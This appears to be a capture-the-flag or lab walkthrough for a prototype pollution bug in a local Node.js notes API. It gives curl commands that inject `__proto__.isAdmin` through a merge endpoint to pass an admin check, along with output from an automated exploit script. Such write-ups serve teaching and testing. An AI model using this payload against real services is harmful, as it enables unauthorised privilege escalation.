# Walkthrough: Prototype Pollution

## Setup

```bash
docker compose up --build -d
```

Confirm the service:

```bash
curl http://localhost:8080/
```

Output:
```json
{
  "app": "NoteShare API v2.1",
  ...
}
```

## Step 1: Confirm the Admin Endpoint is Locked

```bash
curl http://localhost:8080/admin/flag
```

Output:
```json
{"error": "Admin only"}
```

The check runs `if (!ctx.isAdmin)` where `ctx` is a fresh empty object. Without pollution, `ctx.isAdmin` is `undefined`, which is falsy.

## Step 2: Create a Note

```bash
NOTE=$(curl -sf -X POST http://localhost:8080/notes \
  -H "Content-Type: application/json" \
  -d '{"title":"x","body":"x"}')
NOTE_ID=$(echo "$NOTE" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
echo "Note ID: $NOTE_ID"
```

Output:
```
Note ID: lc2abc1def
```

## Step 3: Inject isAdmin via __proto__

```bash
curl -X POST http://localhost:8080/notes/merge \
  -H "Content-Type: application/json" \
  -d "{\"id\":\"$NOTE_ID\",\"options\":{\"__proto__\":{\"isAdmin\":true}}}"
```

Output:
```json
{"message": "Options merged", "options": {}}
```

The server accepted the merge. `Object.prototype.isAdmin` is now `true` for the duration of the Node.js process.

## Step 4: Read the Flag

```bash
curl http://localhost:8080/admin/flag
```

Output:
```json
{"flag": "POC{...}"}
```

The admin check creates `const ctx = {}`. It reads `ctx.isAdmin`, which resolves to `Object.prototype.isAdmin` via the prototype chain. The check passes.

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```

Output:
```
[*] Target: http://localhost:8080

[*] Step 1: creating a note
    Note ID: lc2abc1def

[*] Step 2: injecting __proto__.isAdmin via merge endpoint
    Server response: {'message': 'Options merged', 'options': {}}

[*] Step 3: fetching /admin/flag

[+] Flag: POC{...}
```
